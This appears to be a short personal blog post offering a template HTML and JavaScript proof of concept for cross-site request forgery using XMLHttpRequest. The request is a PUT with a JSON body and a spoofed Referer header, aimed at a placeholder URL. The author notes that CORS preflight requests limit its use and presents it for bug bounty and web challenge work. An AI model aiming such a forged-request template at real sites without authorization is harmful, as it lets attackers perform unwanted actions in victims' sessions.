---
layout: post
title: XHR CSRF PoC 
published: true
categories: [Research, BugBounty]
excerpt: This is just some sample code for when creating an XHR CSRF PoC. It is used for my self learning purposes and work sometimes.
---

This is just some sample code for when creating an XHR CSRF PoC.    
It is used for my self learning purposes and work sometimes.

---

# XHR CSRF PoC

This is just some sample code for when creating an XHR CSRF PoC.    
It is used for my self learning purposes and work sometimes.


  
```html
<script>
function getMe() {
var http;
http = new XMLHttpRequest();
var url = "http://example.com";
http.open("PUT", url, false);
//http.setRequestHeader('Access-Control-Request-Meethod','POST');
//http.setRequestHeader('Access-Control-Request-Meethod','content-type');
http.setRequestHeader('Content-Type','application/json');
http.setRequestHeader('Referer',url);
http.setRequestHeader('Content-Length','33');
http.onreadystatechange = function()
{
	if(http.readyState == 2)
		{var response = http.responseText;
		document.getElementById('result').innerHTML = response;
	}
}
http.send(`Your payload here`);
}

getMe();
</script>

<html>
<div id='result'></div>
</html>
```

Sadly modern browsers nowadays will send an OPTIONS request first to check for XHR, and it is not possible to modify the Origin in the request - it will be set to null.

However, this may be still useful for some basic Web challenges and maybe bug bounty.

Ref: [AJAX in Chrome sending OPTIONS instead of GET/POST/PUT/DELETE?](https://stackoverflow.com/q/21783079/4420129)